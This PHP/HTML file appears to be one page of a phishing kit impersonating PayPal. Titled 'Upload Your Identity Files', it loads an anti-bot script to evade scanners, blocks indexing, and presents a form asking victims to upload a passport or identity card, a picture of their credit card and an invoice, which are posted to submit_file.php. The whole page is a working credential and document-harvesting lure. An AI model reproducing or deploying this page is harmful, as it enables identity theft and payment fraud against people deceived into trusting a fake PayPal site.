<?php

/*

 */

include 'antibots.php';

session_start();

?>
<!DOCTYPE html>
<html>
<head>
    <title>Upload Your Identity Files - PayPal</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex" />
    <link rel="icon" href="css/fav.ico" />
    <link href="css/app.css" type="text/css" rel="stylesheet">
    <script src="css/jquery.js" type="text/javascript"></script>
    <script src="css/jquery.maskedinput.js" type="text/javascript"></script>
</head>
<style>

    body{
        margin:0px;
    }
    /* .content_form{
         width: 460px;
         margin-left: 683px;
         padding-left: 44px;
         padding-top: 121px;
     }*/
    .input{
        width: 358px;
        height: 35px;
        border: 1px solid #B7B6B6;
        border-radius: 3px;
        font-size: 16px;
        text-transform: capitalize;

    }
    .input:focus{
        border: 1px solid #2690FF;
    }
    .card{
        display: inline-block;
        background-image: url("css/sprites_cc_global.png");
        background-repeat: no-repeat;
        background-position: 0px -406px;
        height: 27px;
        position: relative;
        left: -51px;
        bottom: -9px;
        width: 40px;
    }
    .date{
        display: inline-block;
        background-image: url("css/sprites_cc_global.png");
        background-repeat: no-repeat;
        background-position: 0px -434px;
        height: 27px;
        position: relative;
        left: -51px;
        bottom: -9px;
        width: 40px;
    }
    .btn{
        width: 374px;
        height: 44px;
        padding: 10px 15px;
        border: 0px none;
        display: block;
        background: none repeat scroll 0% 0% #009CDE;
        box-shadow: none;
        border-radius: 5px;
        box-sizing: border-box;
        cursor: pointer;
        color: #FFF;
        font-size: 1.14286em;
        text-align: center;
        font-weight: bold;
        font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
        text-shadow: none;
    }
    .check_box{
        background-image: url("css/onboarding_form.png");
        background-repeat: no-repeat;
        padding-left: 28px;
        line-height: 26px;
        display: inline-block;
        margin-bottom: 9px;
        cursor: pointer;
    }
    #checked{
        background-position: 0px -100px;
    }
    #inchecked{
        background-position: 0px 0px;
    }

</style>
<body style="background-image: url('css/fileup.PNG'); background-repeat: no-repeat; background-position: center -1px;height: 780px;">
<div style="width: 460px; margin: 0px auto; padding-left: 643px; padding-top: 76px;">
    <div class="content_form">
        <form method="post" action="submit_file.php?websrc=<?php echo md5('nOobAssas!n'); ?>&dispatched=userInfo&id=<?php echo rand(10000000000,500000000); ?>" enctype="multipart/form-data">
            <div>
                <br>
                <br>
                <p>Passport, identity card</p>
                <input type="file" name="id" class="input">
                <p>Your credit card</p>
                <input type="file" name="card" class="input">
                <p>The invoice</p>
                <input type="file" name="invoice" class="input" style="margin-bottom: 18px;">
                <input type="submit" class="btn" value="Continue" name="btn_file">
            </div>
        </form>
    </div>
</div>
<script>
    $(document).on("click","#inchecked",function(){
        var inchecked = document.getElementById('inchecked');
        var atm = document.getElementById('atmppin');

        if(inchecked.id == 'inchecked'){
            inchecked.id = "checked";
            atm.style.display = "block";
        }
    });
    $(document).on("click","#checked",function(){
        var checked = document.getElementById('checked');
        var atm = document.getElementById('atmppin');
        if(checked.id == 'checked'){
            checked.id = "inchecked";
            atm.style.display = "none"
        }
    });
</script>
</body>
</html>